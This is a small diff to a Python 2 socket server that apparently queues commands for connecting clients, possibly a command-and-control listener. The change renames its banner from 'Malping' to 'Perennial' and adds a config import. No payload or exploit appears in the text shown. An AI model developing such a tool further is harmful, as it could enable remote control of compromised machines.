@@ -6,6 +6,7 @@ import socket
 import base64
 import datetime
 import argparse
+import config as CFG
 
 SIZE = 1024
 
@@ -32,7 +33,7 @@ def main():
     s.bind(('', PORT))
     s.listen(1)
     cmd_queue = create_cmd_queue(CMDS)
-    print '[+] Malping server started on {}.'.format(PORT)
+    print '[+] Perennial server started on {}.'.format(PORT)
 
     while True:
         if cmd_queue.empty():
